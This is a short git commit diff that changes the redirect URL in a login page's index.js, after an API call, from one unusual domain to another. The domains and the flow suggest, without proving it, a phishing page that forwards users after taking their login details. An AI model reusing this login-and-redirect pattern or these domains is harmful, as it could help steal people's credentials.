fc8e260601a9bd843b841c75bb592359cbc4c628
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-15 12:19:17 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://kati.drodge-webview.online/';
+      window.location.href = 'https://chk-paralu.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
